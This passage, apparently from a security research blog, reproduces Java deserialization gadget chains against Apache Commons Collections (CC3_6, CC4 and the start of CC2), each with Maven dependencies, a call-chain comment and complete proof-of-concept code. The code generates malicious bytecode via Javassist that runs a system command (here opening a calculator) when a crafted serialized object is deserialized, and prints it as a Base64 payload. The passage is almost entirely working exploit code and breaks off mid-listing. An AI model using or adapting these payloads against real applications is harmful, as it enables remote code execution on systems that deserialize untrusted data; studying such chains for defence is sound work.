Exception &#123;  </span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);  </span><br><span class="line">        ois.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);  </span><br><span class="line">        objectOutputStream.writeObject(obj);  </span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object val)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj,val);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getByteCodes() <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);  </span><br><span class="line">    ctClass.setSuperclass(classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));  </span><br><span class="line">    ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);  </span><br><span class="line">    <span class="keyword">return</span> ctClass.toBytecode();  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC3-6"><a href="#CC3-6" class="headerlink" title="CC3_6"></a>CC3_6</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.22.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Dependent version:</span></span><br><span class="line"><span class="comment">    commons-collections: 3.1 - 3.2.1</span></span><br><span class="line"><span class="comment">    javassist &gt;= 3.20.0-GA (unnecessary)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">HashMap.readObject()</span></span><br><span class="line"><span class="comment">            HashMap.put()</span></span><br><span class="line"><span class="comment">                HashMap.hash()</span></span><br><span class="line"><span class="comment">                    TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">                        TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                            LazyMap.get()</span></span><br><span class="line"><span class="comment">        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">        ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">        InstantiateTransformer.transform()</span></span><br><span class="line"><span class="comment">            TrAXFilter.newInstance()</span></span><br><span class="line"><span class="comment">                                            TemplatesImpl.newTransformer()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections3_6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//byte[] code = Files.readAllBytes(Paths.get(&quot;/Users/n2ryx/Documents/Compiler/IDEA/Payloads/target/classes/cc/Evil.class&quot;));</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getByteCodes()&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// InstantiateTransformer.transform() -&gt; TrAXFilter.TrAXFilter() -&gt; TemplatesImpl.newTransformer()</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化put时使他不能触发，先给一个无用值，最后反射修改</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="comment">// put触发hash，hashCode方法计算时会在hashCode属性中缓存已经计算过的值，如果再次计算将直接返回值，所以需要删除其key</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(tiedMapEntry,<span class="string">&quot;map&quot;</span>,lazyMap);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(hashMap)));</span><br><span class="line">        deserialize(serialize(hashMap));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getByteCodes() <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);  </span><br><span class="line">    ctClass.setSuperclass(classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));  </span><br><span class="line">    ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);  </span><br><span class="line">    <span class="keyword">return</span> ctClass.toBytecode();  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.22.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Dependent version:</span></span><br><span class="line"><span class="comment">        commons-collections4: 4.0</span></span><br><span class="line"><span class="comment">        javassist &gt;= 3.20.0-GA (unnecessary)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Gadget chain:</span></span><br><span class="line"><span class="comment">        PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">PriorityQueue.heapify()</span></span><br><span class="line"><span class="comment">PriorityQueue.siftDown()</span></span><br><span class="line"><span class="comment">    PriorityQueue.siftDownUsingComparator()</span></span><br><span class="line"><span class="comment">                        TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">                            ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                                ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                                InstantiateTransformer.transform()</span></span><br><span class="line"><span class="comment">        TrAXFilter.newInstance()</span></span><br><span class="line"><span class="comment">                                        TemplatesImpl.newTransformer()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//byte[] code = Files.readAllBytes(Paths.get(&quot;/Users/n2ryx/Documents/Compiler/IDEA/Payloads/target/classes/cc/Evil.class&quot;));</span></span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;getByteCodes()&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// InstantiateTransformer.transform() -&gt; TrAXFilter.TrAXFilter() -&gt; TemplatesImpl.newTransformer()</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// TransformingComparator在CommonsCollections4中实现了Serializable接口，传无用值，反射修改</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        <span class="comment">// heapify()中(size &gt;&gt;&gt; 1) - 1 &gt;= 0，所以需要至少两位填充</span></span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(transformingComparator,<span class="string">&quot;transformer&quot;</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(priorityQueue)));</span><br><span class="line">        deserialize(serialize(priorityQueue));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object val)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getByteCodes() <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();  </span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;EvilClass&quot;</span>);  </span><br><span class="line">    ctClass.setSuperclass(classPool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));  </span><br><span class="line">    ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a calculator\&quot;);&quot;</span>);  </span><br><span class="line">    <span class="keyword">return</span> ctClass.toBytecode();  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Dependent version:</span></span><br><span class="line"><span class="comment">        commons-collections4: 4.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span 